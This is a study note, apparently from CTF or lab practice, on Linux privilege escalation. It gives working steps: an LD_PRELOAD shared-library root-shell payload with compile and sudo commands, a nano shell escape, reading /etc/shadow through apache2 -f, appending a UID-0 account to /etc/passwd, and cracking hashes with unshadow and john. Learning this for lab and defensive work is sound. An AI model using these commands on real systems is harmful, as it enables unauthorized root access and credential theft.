# Linux Previledge Escalation

What to do here?

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

## 1. Linux Eneumeration

Check out [leb-LinuxEchoBeach](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md) for eneumerating Linux System

Also, you can get some knowledge about wargames at my soloutions to overthewire [bandit](https://github.com/Yeaseen/overthewire-solve/tree/main/Bandit)

## 2. Automated Eneumeration Scripts with prospective exploitation points

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LES(Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)

Donlowad any of the script on your local machine and transfer this to the compromized VM either using [scp command](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#copy-files-between-two-different-network-remotely) or creatimg python [simple http server](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#in-the-same-networkhost-and-virtual-oses-file-transfer-between-two-machines-using-python-server)

## 3. Privilege Escalation: Kernel Exploits

- One way:
  Find the Linux Kernel and System versions. Go to exploit-db or dimilar websites to grab a script. Make your you have all the necessary packages installed on the device, otherwise you will just destroy the compromized system.
  You can use the following script for Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)

  - ['overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)
    For this, you need to have gcc installed on the system.

- Another way:
  Search if nano command is exploitable. If exploitable, press ctrl+R, ctrl+X and execute `bash reset; bash 1>&0 2>&0`
  Eventually, you should get the root access.

## 4. Privilege Escalation: Sudo

- Leverage application functions
  Here you have to find an application that supports loading alternative configuration file such as Apache2's -f option to specify an alternative ServerConfigFile. You can load /etc/shadow file using -f option of apache2 command, resulting in an error message that includes the first line of the /etc/shadow file.

- Leverage LD_PRELOAD

  - On some systmes, `bash sudo -l` will give you its current situation related to root privileges. Such as whether env_keep variable is enabled. If it is: env_keep+=LD_PRELOAD, that means we can create a shared library object so file to first unset the env file and load the /bash/bin or /bash/sh file.
  - LD_PRELOAD-->These capabilities often involve manipulating or intercepting function calls within programs, allowing for customization or modification of their behavior.
  - The steps of this privilege escalation vector can be summarized as follows;

    - Check for LD_PRELOAD (with the env_keep option)
    - Write a simple C code compiled as a share object (.so extension) file
    - Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

  - The following about.c code simply spawns a root shell

    ```
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
    }
    ```

  - compile it using gcc into a shared object file using the following parameters:
    `bash gcc -fPIC -shared -o about.so about.c -nostartfiles`
  - Now, we have the capability to employ this shared object file when initiating any program accessible to our user through the sudo command. In our scenario, programs like Apache2, find, or nearly any other program executable with sudo privileges can leverage this shared object file.
  - run the program by specifying the LD_PRELOAD option, resulting in a shell spawn with root previledges
    `bash sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
  - check by running `bash id`

## 5. Privilege Escalation: SUID

Linux privilege controls heavily hinge on managing the interactions between users and files, achieved through permissions. As you're aware, files can possess read, write, and execute permissions, each granted to users based on their privilege levels. However, the dynamics shift with SUID (Set-user Identification) and SGID (Set-group Identification). These mechanisms enable the execution of files with the permission level of either the file owner (SUID) or the group owner (SGID). Follow [this](https://www.scaler.com/topics/special-permissions-in-linux/) and [this](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit). `bash find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. A good practice would be to compare executables on this list with GTFOBins [suid](https://gtfobins.github.io/#+suid)

- One way: reading the /etc/shadow file or adding our user to /etc/passwd if you can. Try to use cp command to get the /etc/passwd file to /tmp directory.

  - run `bash openssl passwd -1 salt THM passsword`
  - add the following line to etc/passwd
    <attacker_name>:<created_hash_for_passsword>:0:0:root:/root:/bin/sh

- Other way: Password Cracking using johntheripper
  - On your Kali Linux: put contents of /etc/passwd to password.txt and contents of /etc/shadow to shadow.txt
  - run `bash base64 /etc/passswd | base64 --decode` if you don't have read permission. It's one way to read the original contents of a file you don't have permission.
  - run `bash unshadow passwd.txt shadow.txt > passwords.txt`
  - get password of the current users: `bash john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
